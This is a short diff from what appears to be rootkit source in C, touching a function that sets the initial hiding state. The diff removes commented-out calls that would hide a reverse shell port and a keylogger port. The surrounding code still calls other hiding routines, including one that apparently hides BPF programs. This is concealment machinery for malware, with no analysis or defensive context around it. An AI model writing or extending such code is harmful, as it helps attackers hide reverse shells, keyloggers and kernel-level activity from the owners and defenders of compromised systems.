@@ -169,14 +169,6 @@ static int set_initial_hide_state(hider_context_t *hider_ctx) {
     if (ret != 0)
         return ret;
 
-    // ret = hider_hide_port(hider_ctx, REVERSE_SHELL_PORT);
-    // if (ret != 0)
-    //     return ret;
-
-    // ret = hider_hide_port(hider_ctx, KEYLOGGER_PORT);
-    // if (ret != 0)
-    //     return ret;
-
     ret = hide_bpf(hider_ctx);
     if (ret != 0)
         return ret;
